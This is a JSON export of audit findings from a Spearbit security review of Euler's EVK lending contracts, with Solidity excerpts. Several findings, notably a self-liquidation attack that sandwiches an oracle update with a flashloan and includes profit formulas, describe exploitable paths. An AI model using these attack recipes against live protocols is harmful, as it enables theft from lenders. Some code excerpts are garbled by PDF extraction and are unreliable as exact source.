[{"title": "PegStabilityModule assumes underlying has 18 decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The swap amounts in the PegStabilityModule are quoted in the same decimals as the synth, which If the pegged underlying has is always 18. different decimals, it's profitable to perform the swap. It is therefore only compatible with underlying's of 18 decimals.", "labels": ["Spearbit", "Euler", "Severity: High Risk"]}, {"title": "Self-liquidations of leveraged positions can be profitable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "An attacker can perform the following attack by sandwiching a price oracle update: 1. Taking on a leveraged position by flashloaning collateral and max-borrowing the debt token. 2. Performing the price update. 3. Liquidating themself (from another subaccount). Profitability: The attack is profitable when the entire collateral balance cl is seized (to repay the flashloan) while repaying fewer debt assets than assets that were borrowed. This difference of maxBorrowAssets - maxRepayAs- sets of debt assets is the profit. # discount factor: df = 1 - discount # collateralPrice_0 = price before the oracle update # collateralPrice_1 = price after the oracle update collateralPrice_1 = collateralPrice_0 * (1 - priceDrop) # the maximum debt asset we can borrow is maxBorrowAssets = LTV_borrow * collateralBalance * collateralPrice_0 / debtPrice # from the liquidation code we see that seizedAssets = repayValue / discountFactor / collateralPrice_1 = (repayAssets * debtPrice) / discountFactor / collateralPrice_1 # expressed in terms of repayAssets that seize the maximum (entire) collateral balance maxRepayAssets = collateralBalance * discountFactor * collateralPrice_1 / debtPrice # profitable if this inequality holds maxBorrowAssets > maxRepayAssets LTV_borrow * collateralBalance * collateralPrice_0 / debtPrice > collateralBalance * discountFactor * collateralPrice_1 / debtPrice <=> LTV_borrow > discountFactor * (1 - priceDrop) 6 The discountFactor is set to max(hs_liquidation, 0.8). The attack is profitable if an attacker can sandwich a price oracle update that would end up with LTV_borrow > discountFactor * (1 - priceDrop). Some oracle adapters, like Redstone and Pyth, allow the users to update or even choose a preferable price. In this case, the attack could even be performed in a single transaction batch for risk-free profit. Note: Using several smaller liquidations can increase the overall liquidation discount and lead to a more profitable attack. A profitable attack also leaves bad debt for the protocol. See this Notebook for further profitability analysis. Example: LTV_borrow = LTV_liquidation = 90%. Oracle quotes 1 collateral at $1 (and debt is fixed at $1). Sandwich collateral oracle price update to $0.90: 1. Flashloan 1000 collateral and build a position of (1000 collateral, 900 debt) at LTV_borrow. 2. Oracle sets collateral price to $0.90. (for example, Redstone / Pyth require the user to trigger the update.) 3. Liquidate self by repaying maxRepayAssets = 810. discountFactor = healthscore_liquidation = collateralBalance * collateralPrice_1 * LTV_liquidation / ,! debtValue = 0.90 maxBorrowAssets: 900 maxRepayAssets: 810 seizedAssets: maxRepayAssets * debtPrice / discountFactor / collateralPrice_1 = 810D * 1$/D / 0.9 / ,! Profit: maxBorrowAssets - maxRepayAssets = 900 - 810 = 90 0.9$/C = 1000C The current maximum discount is set to 20% which can lead to profitable attacks for high LTV collateral assets even for small price drops. The remaining debt will be bad debt for the protocol and might be socialized across all lenders.", "labels": ["Spearbit", "Euler", "Severity: High Risk"]}, {"title": "Interest accumulated, but not accounted yet, could be reset if Governance updates the interest rate model when in \"Interest Overflows\" state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Let's assume that borrowers have borrowed an amount X for which when Cache.loadVault() is executed, the interest accrued added to X would make the newTotalBorrows value overflow the MAX_SANE_DEBT_- AMOUNT. When such a scenario happens, the totalBorrows, interestAccumulator and lastInterestAccumulatorUpdate are not updated (same for accumulatedFees and totalShares). In practice, the interest accrued is \"paused\" and won't be accrued and grow until enough will be paid to allow the next calculation of newTotalBorrows to not overflow anymore. If during this scenario, the Governance updated the interest rate model to an empty one or a reverting one, all the accumulated interest will be reset and lost forever. function setInterestRateModel(address newModel) public virtual nonReentrant governorOnly { VaultCache memory vaultCache = updateVault(); vaultStorage.interestRateModel = newModel; vaultStorage.interestRate = 0; uint256 newInterestRate = computeInterestRate(vaultCache); logVaultStatus(vaultCache, newInterestRate); emit GovSetInterestRateModel(newModel); } 1) updateVault() won't update the vault storage/cache because of the overflow. 2) vaultStorage.interestRate = 0 update the interest rate to zero, meaning that no interest will be accrued anymore. 3) computeInterestRate(vaultCache); when the model reverts or is address(0) do not update interestRate leaving it to the previous value that in this case is 0 (update in the instruction above). At this point, the next time updateVault() will be called it will not overflow anymore because the interestRate is zero and newInterestAccumulator is equal to vaultCache.interestAccumulator that has not been updated since the beginning of the overflow phase. totalBorrows and interestAccumulator will be updated with the current values (no changes) and lastInter- estAccumulatorUpdate will be updated to block.timestamp, resulting in a loss of the total interest accrued but never accounted until now (since the start of the interest overflow period).", "labels": ["Spearbit", "Euler", "Severity: Medium Risk"]}, {"title": "Governance.setInterestRateModel is missing sanity checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The Governance.setInterestRateModel is not actively checking the user newModel input that rep- resents the new IRM rate model. When a new IRM is provided, the interest rate is resetted to 0 and then updated via computeInterestRate(vaultCache). The transaction should revert when:  newModel is equal to the current model.  newModel is a broken IRM model that will revert when computeInterestRate is executed. The second case should be correctly handled, given that it violates a white paper invariant defined in the Interest Rate section: When a vault has address(0) installed as an IRM, an interest rate of 0% is assumed. vault's IRM fails, the vault will ignore this failure and continue with the previous interest rate. If a call to the Because the interest rate has been already reset to 0, when the new interest rate is called and reverts, it won't update the value to the old one but will remain equal to 0. In general, this case should be handled because the governance should not be able to actively set the IRM to a faulty one. Allowing such case will mean that borrowers won't accrue any interest on their open position and lenders will not accrue any rewards. To be able to handle this case, the computeInterestRate must be refactored to return if the IRM call has reverted.", "labels": ["Spearbit", "Euler", "Severity: Medium Risk"]}, {"title": "EulerSavingsRate maxWithdraw and maxRedeem are not returning the correct underestimated value when owner has a controller enabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The EulerSavingsRate is an ERC4626 vault that integrates with the EVC ecosystem, allowing the module to be used as collateral for EVK vaults. Because ESR shares can be used as collaterals, it's important that operations like transfer, transferFrom, withdraw and redeem ensure that users who have enabled a controller are still healthy after the execution of such operation. For this reason, any of the above functions executes the EVCUtil.requireAccountStatusCheck. Because of this integration with EVC and EVK, the EulerSavingsRate module must implement the same logic implemented by Vault when the ERC4626 functions maxRedeem and maxWithdraw are called. The value returned by such functions should be underestimated to zero if the owner parameter has enabled a controller (the user could be unhealthy and the transaction could revert).", "labels": ["Spearbit", "Euler", "Severity: Medium Risk"]}, {"title": "IRMSynth's targetQuote assumes reference asset has 18 decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The IRMSynth.targetQuote parameter is set to 1e18. It is compared against the output of ora- cle.getQuote(1e18, synth, referenceAsset) that returns a reference asset amount which will be in reference asset decimals.", "labels": ["Spearbit", "Euler", "Severity: Medium Risk"]}, {"title": "maxMint/maxDeposit can overestimate shares/assets as it ignores totalShares overflow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The maxMint function currently returns shares < MAX_SANE_AMOUNT ? shares : MAX_SANE_AMOUNT where shares are the max-deposit assets converted to shares. However, it needs to take the current totalSupply into account as totalSupply + shares <= MAX_SANE_AMOUNT should hold. It can return a larger amount than what can actually be accepted, according to EIP4626, this breaks the behavior: MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). Note that maxDepositInternal only looks at cash and if the vault has a high utilization, maxDeposit- Internal might return a large value, indeed resulting in a large shares amount that would overflow the totalSupply's MAX_SANE_AMOUNT.", "labels": ["Spearbit", "Euler", "Severity: Medium Risk"]}, {"title": "Vault.maxRedeemInternal should always underestimate when user has a controller enabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "In the current implementation of Vault.maxRedeemInternal, the function underestimates the amount that the user can redeem/withdraw to zero if the owner has enabled the asset as collateral and has a controller enabled. A more correct underestimation would be return Shares.wrap(0) when a controller has been enabled without checking if the asset has been enabled as collateral. The current implementation of the checkAccountStatus of a Controller Vault inside the RiskManager contract will revert if the user is unhealthy, no matter what the operation was or if it involved the transfer or withdraw/redeem of a non-collateral (for the user) asset.", "labels": ["Spearbit", "Euler", "Severity: Medium Risk"]}, {"title": "initVaultCache can revert breaking liveness assumptions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "While some parts of the initVaultCache gracefully handle overflows, other parts can still revert: // multiplication can overflow uint256 newTotalBorrows = ,! vaultCache.interestAccumulator; vaultCache.totalBorrows.toUint() * newInterestAccumulator / // if newTotalBorrows didn ,! uint256 feeAssets = (newTotalBorrows - vaultCache.totalBorrows.toUint()) * interestFee.toUint16() interestAccumulator > interestFee. (unless we use FullMath to compute newTotalBorrows) t overflow either because it was divided by t overflow, this shouldn   / (1e4 << INTERNAL_DEBT_PRECISION_SHIFT); The guarantee described in the Whitepaper is broken: In the event that a vault encounters an overflow (either in rpow or its accumulator) the accumulator will stop growing, meaning that no further interest will be earned/charged. However, debts can still be repaid and funds withdrawn.", "labels": ["Spearbit", "Euler", "Severity: Medium Risk"]}, {"title": "Setting LTV configs without a configured oracle makes EVK unusable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The setLTV function is used to set a new LTV config for a new or an existing collateral address. However, it isn't checked whether the added collateral has a configured oracle. If collaterals are added without a configured oracle, most of the EVK functionality will be bricked. The setLTV function: 14 /// @inheritdoc IGovernance function setLTV(address collateral, uint16 ltv, uint32 rampDuration) public virtual nonReentrant ,! governorOnly { // self-collateralization is not allowed if (collateral == address(this)) revert E_InvalidLTVAsset(); ConfigAmount newLTVAmount = ltv.toConfigAmount(); LTVConfig memory origLTV = vaultStorage.ltvLookup[collateral]; // If new LTV is higher than the previous, or the same, it should take effect immediately if (newLTVAmount >= origLTV.getLTV(true) && rampDuration > 0) revert E_LTVRamp(); LTVConfig memory newLTV = origLTV.setLTV(newLTVAmount, rampDuration); vaultStorage.ltvLookup[collateral] = newLTV; if (!origLTV.initialized) vaultStorage.ltvList.push(collateral); emit GovSetLTV( collateral, newLTV.targetTimestamp, newLTV.targetLTV.toUint16(), newLTV.rampDuration, newLTV.originalLTV.toUint16() ); }", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Suppliers will be able to mint new shares even if vaultCache.totalShares is virtually above the MAX_SANE_AMOUNT", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Like for the totalBorrows, the Cache.initVaultCache could also overflow for the totalShares. This scenario happens when part of the accrued interest must be accounted to the protocol/vault owner as fees (in shares). This is the logic that calculates the new total shares amount given feeAssets > 0: if (feeAssets != 0) { uint256 newTotalAssets = vaultCache.cash.toUint() + OwedLib.toAssetsUpUint256(newTotalBorrows); newTotalShares = newTotalAssets * newTotalShares / (newTotalAssets - feeAssets); newAccumulatedFees += newTotalShares - vaultCache.totalShares.toUint(); } The newTotalShares re-calculated to account for the fees could be virtually above the upper limit of MAX_- SANE_AMOUNT. If we are in such a scenario, the function won't update vaultCache.accumulatedFees and vault- Cache.totalShares: 15 if (newTotalShares != vaultCache.totalShares.toUint() && newTotalShares <= MAX_SANE_AMOUNT) { vaultCache.accumulatedFees = newAccumulatedFees.toShares(); vaultCache.totalShares = newTotalShares.toShares(); } As a consequence, all the accrued interest, until the new share amount is not overflowing anymore, will be ac- counted to the in total to the suppliers and not to the protocol/vault owner. Unlike the overflowing of the totalBor- rows the not accounted accumulatedFees are lost forever for the protocol. The second side effect of not accounting the shares to be minted to the protocol/vault owner is that users will be anyway able to mint new shares up to the delta MAX_SANE_AMOUNT - vaultCache.totalShares even if virtually, the real value of vaultCache.totalShares would be already above MAX_SANE_AMOUNT.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Token transfer methods should not allow from == address(0) and to == address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The functions transfer, transferFrom and transferFromMax allow the caller to specify arbitrary from and to. Both the input parameters are allowed to assume the address(0) value. Both transfer and transferFromMax internally will execute transferFrom with some custom logic depending on which function is executed. /// @inheritdoc IERC20 function transfer(address to, uint256 amount) public virtual reentrantOK returns (bool) { return transferFrom(address(0), to, amount); } /// @inheritdoc IToken function transferFromMax(address from, address to) public virtual reentrantOK returns (bool) { return transferFrom(from, to, vaultStorage.users[from].getBalance().toUint()); } /// @inheritdoc IERC20 function transferFrom(address from, address to, uint256 amount) public virtual nonReentrant returns ,! (bool) { (, address account) = initOperation(OP_TRANSFER, from == address(0) ? CHECKACCOUNT_CALLER : from); if (from == address(0)) from = account; if (from == to) revert E_SelfTransfer(); Shares shares = amount.toShares(); decreaseAllowance(from, account, shares); transferBalance(from, to, shares); return true; } 16 Allowing to transfer shares to the address(0) (to = address(0)) should not be permitted, given that the same behavior in BalanceUtils.increaseBalance will result in a revert. Allowing to execute transferFromMax with from = address(0) (with the ability to perform the transfer to address(0)) will instead enable a funky behavior. In this case, the balance of address(0)will be used as theamountbuttransferFromwill use themsg.sender as the caller. Let's see an example: 1) Alice owns 3e18 shares. 2) Alice calls transfer(address(0), 1e18) sending 1e18 shares to address(0). 3) Alice calls transferFromMax(address(0), bob), she wants to transfer her whole balance of 2e18 shares to Bob. When transferFromMax is executed, Alice owns 2e18 shares, but the function will use the balance of address(0) Inside as the source of the amount to be transferred (vaultStorage.users[from].getBalance().toUint()). transferFrom, the from value will be changed from address(0) to Alice and will transfer 1e18 (the shares ac- counted in the balance of address(0)) from Alice to Bob. The result is that Alice has not transferred her whole balance of 2e18 to Bob but just 1e18.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Borrowers could be able to borrow avoiding the borrowCap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Let's assume that the borrowCap has been configured with a value near MAX_SANE_DEBT_AMOUNT and that we are in a situation where Cache.initVaultCache has overflown when the snapshot has been taken. Cache.initVaultCache overflows when totalBorrows + the accrued interest would be bigger than MAX_SANE_- DEBT_AMOUNT. In this case, both totalBorrows and interestAccumulator are not updated in the vault cache and storage. Let's also assume that when the snapshot was taken totalBorrows (that because of the overflow does not include the accrued interest) is below vaultCache.borrowCap even if in theory it would be virtually already above such cap. Given these premises, a borrower could be able to perform a borrowing operation avoiding the borrow caps if the amount borrowed is lower than totalBorrows - MAX_SANE_DEBT_AMOUNT. When if (borrows > vaultCache.borrowCap && borrows > prevBorrows) revert E_BorrowCapEx- ceeded(); is evaluated, snapshot.borrows has been initialized with the cached version of the totalBorrows that was not including the accrued interest. 17", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Borrowers will be able to borrow even if the totalBorrows is virtually already above the MAX_SANE_- DEBT_AMOUNT", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Let's assume that there's no borrow cap configured or that the borrow cap is very near the MAX_- SANE_DEBT_AMOUNT. Let's also assume that the current totalBorrows + accrued interest overflows the MAX_SANE_- DEBT_AMOUNT value. In this scenario, the Cache.initVaultCache will not accrue the interest into totalBorrows to avoid overflowing and the totalBorrows and interestAccumulator value will remain unchanged in both the vault cache and storage. In this case, a borrower could be able to perform a borrow operation if the amount borrowed is less than the delta MAX_SANE_DEBT_AMOUNT - totalBorrows. This behavior should be forbidden given that:  The totalBorrows is virtually already over the MAX_SANE_DEBT_AMOUNT is we consider the accrued interest.  The borrower was able to open a borrowing position with a favorable non-updated interestAccumulator.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "setHookConfig and setConfigFlags should validate the new flags value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Both Governance.setHookConfig and Governance.setConfigFlags functions allow the caller to set an arbitrary value of the flags without performing any sanity checks. This means that the user could enable flags that are not currently supported by the current implementation of the vault. If future implementation of the EVK will use those flags, the vault instance could act in an unexpected way (reverts, can't withdraw, redeem, borrow or in general is disrupted). The scenario would be even more problematic if the vault has also renounced to the ownership and the flags cannot be changed anymore.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Governance should not be able to change the vault's name and symbol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The current implementation of the Governance contract allows the governor to update at any point and with any value, even an empty one, both the name and symbol of the deployed EVault. These values are later on used in Token.name and Token.symbol. Allowing such behavior could create confusion and could be leveraged by malicious users to pursue attack vectors like scams or code injections.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Consider reverting the flashloan operation if the returned amount of is not exactly the original balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The current flashloan logic will revert if the new EVault balance is lower compared to the one snapshotted before the flashloan. if (asset.balanceOf(address(this)) < origBalance) revert E_FlashLoanNotRepaid(); With such logic, the flashloan function allows, without any valid reason, the caller to transfer more asset than required. In such a scenario, the user will be forced to include in the batch a skim execution, otherwise, the surplus \"donated\" to the vault will be lost (skimmed by someone else in the future).", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "CFG_EVC_COMPATIBLE_ASSET should be immutable and not be allowed to be changed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The role of the governance config flag CFG_EVC_COMPATIBLE_ASSET is to ensure that the underlying vault asset is not transferred to a subaccount (in the EVC context) if such asset is not EVC compatible. The name of the flag, its meaning, and its role are self-explanatory and very explicit. Such a flag should be set to true when the underlying asset of the EVault is an EVC-compatible asset, and to false if otherwise it's a \"normal\" ERC20-like token. Currently, the Governance module allows the owner to change the value of such flag at any moment and to a value that could be wrong given the EVault configuration given that there is no validation between the flag's value and the underlying vault's asset. Given such premises, we suggest to:  Set the CFG_EVC_COMPATIBLE_ASSET flag as an immutable value.  Initialize the CFG_EVC_COMPATIBLE_ASSET flag when the EVault is initialized.  Initialize the flag to true if the asset exposes the EVC() getter and if the address returned by such getter is equal to the evc address used for the EVault just deployed.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Virtual shares steal interest", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "When redeeming (or withdrawing) vault shares, the conversion uses the total shares including the virtual shares to compute the principal and interest earned: 20   redeem // in // shares * (totalAssets + 1e6) / (totalShares + 1e6) Assets assets = shares.toAssetsDown(vaultCache); function toAssetsDown(Shares amount, VaultCache memory vaultCache) internal pure returns (Assets) { (uint256 totalAssets, uint256 totalShares) = ConversionHelpers.conversionTotals(vaultCache); unchecked { return TypesLib.toAssets(amount.toUint() * totalAssets / totalShares); } } library ConversionHelpers { ,! // virtual deposit used in conversions between shares and assets, serving as exchange rate manipulation mitigation uint256 constant VIRTUAL_DEPOSIT_AMOUNT = 1e6; function conversionTotals(VaultCache memory vaultCache) internal pure returns (uint256 totalAssets, uint256 totalShares) { unchecked { totalAssets = vaultCache.cash.toUint() + vaultCache.totalBorrows.toAssetsUp().toUint() + ,! VIRTUAL_DEPOSIT_AMOUNT; totalShares = vaultCache.totalShares.toUint() + VIRTUAL_DEPOSIT_AMOUNT; } } } Therefore, the virtual shares have their own fair share on the total assets (including virtual assets), essentially earning interest and locking it up. This interest cannot be withdrawn as the virtual shares are not owned by anyone.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Immutable EVK vault creation via GenericFactory could be frontrunned by an update of the imple- mentation, different from the one chosen by the caller", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "GenericFactory.createProxy is the function that anyone should use to deploy a valid and recog- nized EVK compatible vault. The function allows the caller to specify an upgradeable parameter that when it's false will deploy an immutable vault using the current value of the state variable implementation. This state variable can be changed at any time by the GenericFactory admin via the setImplementation function. The EVK white paper states that: After creating an immutable vault, the vault's implementation should be confirmed to be the desired version, since it could've been changed by the factory admin prior to vault creation. It's important to allow the vault creator to ensure that the vault will be created with the desired and expected implementation without the risk of being frontrunned on purpose or mistakenly. 21", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "IRMSynth should revert when deployed with a non-compatible oracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Unlike the IRMLinearKink which does not have any external dependencies, the IRMSynth IRM has 3 different dependencies. Given that the oracle is the main dependency, the deployment of the IRM should revert if the very first call reverts or returns an invalid value. This means that the oracle has one of the following problems:  It's not an Euler oracle.  It has not been correctly configured to support synth and referenceAsset.  It's not working as expected, given that the returned price is 0.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "ESynth should only allow the execution of allocate and deallocate to and from EVC-compatible vault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The allocate and deallocate functions allow the ESynth contract to deposit and withdraw ESynth tokens from EVC compatible vaults specified by the caller in the function input parameter. The specified vault should follow these requirements:  It's an EVC-compatible vault.  Use the same EVC address used by the ESynth. Both these requirements are not checked when those functions are executed. Furthermore, when an allocate is performed, the vault is added to the ignore total supply. happening for the full allocated amount, the vault is not deleted from the ignored total supply. If the deallocation is", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "IRMSynth special-cases oracle price of 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The IRMSynth._computeRate code treats a quoted amount of 0 as an error condition. However, the Euler oracles revert on error conditions and don't use a return value of 0 to indicate errors.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Non-standard ERC20 behavior for EVault with from=address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The Token module that is used for the eVault ERC20 shares handles a transferFrom (and trans- ferFromMax) with from=address(0) as a transfer from the EVC-authenticated account (usually msg.sender). When integrating eVault ERC20 tokens this special behavior is unexpected and could lead to incompatibilities. Note that this is still an issue even if the integrator does not use the EVC as the entrypoint and just treats the vault as a standard ERC20 token.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Fee shares are minted at worse price for fee receivers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Whenever interest is accrued, part of the interest is taken as a fee. This fee is used to mint shares for the \"fee receivers\". The code should work like adding (newInterest - feeAssets) to totalAssets, then depositing feeAssets into the vault to mint new shares for them. However, it is currently ignoring the VIR- TUAL_DEPOSIT_AMOUNT = 1e6 of the deposit step conversion. This leads to the fee receivers receiving fewer shares in practice, compared to them receiving the fee as \"assets\" and depositing themselves. (As they mint at a higher share price totalAssets / totalShares > (totalAssets + VIRTUAL_DEPOSIT_AMOUNT) / (total- Shares + VIRTUAL_DEPOSIT_AMOUNT) for most vaults.) the virtual amounts are", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "ESynth.mint can emit 0-Transfer events for non-allowed minters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The mint function can currently be called by anyone, even if they're not an authorized minter. Autho- rized minters are the ones for whom the admin has set capacity. In order to avoid this, it should revert if amount == 0, what would prevent the executions and emitting Trans- fer(address(0), account, 0) event when _mint(...) is called. Mint checks involving capacity should add logic in order to handle cases where capacity == 0 && amount == 0, as it will return false allowing the execution of mint function. Same allowed behavior happens on burn function when using amount == 0 even if you shouldn't be able to effec- tively burn from an account.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "evc used by the PegStabilityModule and ESynth contract may not be the same", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "PegStabilityModule constructor stores an ESynth address which is not enforced to be related to the corresponding EVC used. Add a sanity check that enforces that PegStabilityModule EVC is the same one used by the ESynth contract. To be able to do that, the evc variable inside EVCUtil should be exposed. Now it's an internal one without any getter.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "PegStabilityModule should change sanity checks from > to >=", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "toUnderlyingFeeBPS and toSynthFeeBPS must be < BPS_SCALE otherwise quoteToUnderlying- GivenOut and quoteToSynthGivenOut will revert because of division by zero. Also, when they are equal ESynth/underlying for underlying/ESynth. to BPS_SCALE the user would get nothing back when they swap amountIn of", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "PegStabilityModule quoteToSynthGivenOut should round in favor of the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The value returned by quoteToSynthGivenOut: function quoteToSynthGivenOut(uint256 amountOut) public view returns (uint256) { return amountOut * BPS_SCALE / (BPS_SCALE - TO_SYNTH_FEE); } Will be used to quote how many underlying tokens the user must pay to get back amountOut of ESynth tokens when called at swapToSynthGivenOut: function swapToSynthGivenOut(uint256 amountOut, address receiver) external returns (uint256) { uint256 amountIn = quoteToSynthGivenOut(amountOut); underlying.safeTransferFrom(_msgSender(), address(this), amountIn); synth.mint(receiver, amountOut); return amountIn; }", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "PegStabilityModule quoteToUnderlyingGivenOut should round in favor of the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The value returned by quoteToUnderlyingGivenOut: function quoteToUnderlyingGivenOut(uint256 amountOut) public view returns (uint256) { return amountOut * BPS_SCALE / (BPS_SCALE - TO_UNDERLYING_FEE); } Will be used to determine the amount of Esynth assets that the user needs to pay to get back amountOut of underlying assets when calling swapToUnderlyingGivenOut: function swapToUnderlyingGivenOut(uint256 amountOut, address receiver) external returns (uint256) { uint256 amountIn = quoteToUnderlyingGivenOut(amountOut); synth.burn(_msgSender(), amountIn); underlying.safeTransfer(receiver, amountOut); return amountIn; } This value should favor the protocol and not the user.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "Single-step admin transfer can be risky", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "GenericFactory.sol implements the role of upgradeAdmin which performs the action of setting new implementations or setting a new upgradeAdmin. It uses a single-step role transfer design, which adds the risk of setting an unwanted role owner by accident. If the ownership transfer is not done with excessive care it can be lost forever. Similarly, it happens with the Open Zeppelin Ownable library at ESynth contract, which could be Ownable2Step to avoid possible problems.", "labels": ["Spearbit", "Euler", "Severity: Low Risk"]}, {"title": "delegateToModuleView's caller encoding can be packed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The delegateToModuleView function appends the caller address for other view functions that are delegatecall'd into. It's currently appended as a 32-bytes value (with the upper 12 bytes being zero). It can be read using ProxyUtils.useViewCaller().", "labels": ["Spearbit", "Euler", "Severity: Gas Optimization"]}, {"title": "Avoid using +=, -= operators for storage variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "+= and -= operations on storage variables are cheaper if declared as totalAssetsDeposited = totalAssetsDeposited + assets. Gas optimization from this is ~15-30 gas per call/instance. Over 948 in the tests after the 3 instances change.", "labels": ["Spearbit", "Euler", "Severity: Gas Optimization"]}, {"title": "requires using input parameters should go right after the function declaration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "require statements of input parameters are commonly declared right after the function declaration to avoid executing extra logic in the case of an inevitable revert.", "labels": ["Spearbit", "Euler", "Severity: Gas Optimization"]}, {"title": "Logic only used can be inlined in order to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Some logic in checkNoCollateral is only used once and can be inlined in order to save gas and simplify the logic by reducing steps.", "labels": ["Spearbit", "Euler", "Severity: Gas Optimization"]}, {"title": "Immutable variables are more gas efficient than storage variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "The governor and feeReceiver addresses are declared as variables public. When only assigned once, variables should be marked as immutable for gas optimization, reducing the number of SLOAD operations and improving performance.", "labels": ["Spearbit", "Euler", "Severity: Gas Optimization"]}, {"title": "Variable can be cached to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVK-April-2024.pdf", "body": "Multiple accesses to implementation in createProxy function leads to inefficiencies in gas usage. Caching it into a local variable can save gas and simplify the code.", "labels": ["Spearbit", "Euler", "Severity: 